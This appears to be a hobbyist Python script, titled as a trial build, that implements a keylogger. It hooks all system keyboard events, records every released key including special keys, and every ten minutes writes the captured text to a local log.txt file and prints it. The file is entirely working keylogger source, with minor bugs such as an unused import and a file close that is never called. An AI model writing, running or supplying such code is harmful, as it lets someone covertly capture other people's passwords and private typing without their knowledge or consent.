# Trail Build and Test For Keylogger

from re import L
import keyboard
from threading import Timer
from datetime import datetime


Send_Report = 600 

class Keylogger:
  def __init__(self,interval,report_method="txt"):
    self.interval  = interval
    self.report_method = report_method
    self.log = ""

    self.start_dt = datetime.now()
    self.stop_dt = datetime.now()

  def callback(self, event):
    name = event.name
    if len(name) > 1:
      if name == "space":
        name = " "
      elif name == "enter":
        name = "[enter]/n"
      elif name == "decimal":
        name = "."
      else:
        name = name.replace(" ","_")
        name = f"[{name.upper()}]"

    self.log = self.log + name  
    
  def write(self,keylog):
    f= open("log.txt","w+")
    f.write(keylog)
    f.close

    f= open("log.txt","r")
    if f.mode == 'r':
      content = f.read()
      print(content)

  def report(self):

    if self.log:
      self.end_dt = datetime.now()
      self.write(self.log)
      self.start_dt = datetime.now()

    self.log = ""
    timer = Timer(interval=self.interval, function=self.report)
    timer.daemon = True
    timer.start()

  def start(self):
    self.start_dt = datetime.now()
    keyboard.on_release(callback=self.callback)
    self.report()
    keyboard.wait()

if __name__ == "__main__":
  keylogger = Keylogger(interval=Send_Report, report_method="txt")
  keylogger.start()



    
      